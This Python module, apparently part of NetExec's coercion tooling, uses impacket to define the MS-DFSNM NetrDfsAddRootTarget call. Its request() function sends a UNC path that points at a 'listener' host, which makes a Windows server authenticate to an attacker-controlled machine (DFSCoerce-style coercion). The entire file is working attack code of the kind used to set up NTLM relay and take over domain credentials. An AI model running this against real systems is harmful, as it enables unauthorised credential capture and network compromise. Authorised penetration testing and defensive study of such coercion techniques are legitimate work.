from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import LPWSTR, ULONG, BOOL, NULL

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError

class NetrDfsAddRootTarget(NDRCALL):
    """
    NET_API_STATUS NetrDfsAddRootTarget(
        [in, unique, string] LPWSTR pDfsPath,
        [in, unique, string] LPWSTR pTargetPath,
        [in] ULONG MajorVersion,
        [in, unique, string] LPWSTR pComment,
        [in] BOOLEAN NewNamespace,
        [in] ULONG Flags
    );
    """
    opnum = 23
    structure = (
        ("pDfsPath", LPWSTR),  # Type: LPWSTR
        ("pTargetPath", LPWSTR),  # Type: LPWSTR
        ("MajorVersion", ULONG),  # Type: ULONG
        ("pComment", LPWSTR),  # Type: LPWSTR
        ("NewNamespace", BOOL),  # Type: BOOLEAN
        ("Flags", ULONG),  # Type: ULONG
    )


class NetrDfsAddRootTargetResponse(NDRCALL):
    structure = ()


def request(dce, target, listener):
    request = NetrDfsAddRootTarget()
    request["pDfsPath"] = f"\\\\{listener}\\a\x00"
    request["pTargetPath"] = NULL
    request["MajorVersion"] = 0
    request["pComment"] = "lodos\x00"
    request["NewNamespace"] = 0
    request["Flags"] = 0
    dce.request(request)